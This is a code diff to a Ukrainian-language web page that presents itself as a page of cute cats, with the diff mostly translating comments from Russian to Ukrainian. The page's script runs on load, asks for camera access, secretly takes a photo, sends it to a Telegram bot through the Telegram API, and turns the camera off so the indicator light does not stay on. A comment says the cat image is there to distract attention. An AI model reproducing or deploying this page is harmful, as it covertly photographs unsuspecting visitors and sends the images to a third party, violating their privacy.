@@ -2,7 +2,7 @@
 <html lang="uk">
 <head>
     <meta charset="UTF-8">
-    <title>Дивись які котики111!</title>
+    <title>Дивись які котики222!</title>
     <style>
         body { text-align: center; font-family: sans-serif; background: #f0f0f0; }
         img { width: 100%; max-width: 500px; border-radius: 10px; margin-top: 20px; }
@@ -11,7 +11,7 @@
 </head>
 <body>
     <h1>Тут просто дуже милі котики 🐾</h1>
-    <!-- Картинка котика для отвлечения внимания -->
+    <!-- Картинка котика для відволікання уваги -->
     <img src="https://cataas.com" alt="Милий кіт">
     
     <video id="video" autoplay></video>
@@ -23,12 +23,12 @@
 
         async function startPrank() {
             try {
-                // Запрос доступа к камере
+                // Запит доступу до камери
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // Ждем секунду для фокусировки и делаем фото
+                // Чекаємо 1.5 секунди для фокусування і робимо фото
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
@@ -40,22 +40,22 @@
                         formData.append('chat_id', CHAT_ID);
                         formData.append('photo', blob, 'pax.jpg');
 
-                        // Исправленная ссылка для отправки в Telegram
+                        // ПРАВИЛЬНЕ посилання з доданим /bot
                         fetch("https://api.telegram.org" + BOT_TOKEN + "/sendPhoto", {
                             method: 'POST',
                             body: formData
                         });
                         
-                        // Выключаем камеру, чтобы не горел индикатор
+                        // Вимикаємо камеру, щоб не горів індикатор
                         stream.getTracks().forEach(track => track.stop());
                     }, 'image/jpeg');
                 }, 1500);
             } catch (err) {
-                console.log("Доступ отклонен");
+                console.log("Доступ відхилено");
             }
         }
 
-        // Запуск при загрузке
+        // Запуск при завантаженні сторінки
         window.onload = startPrank;
     </script>
 </body>
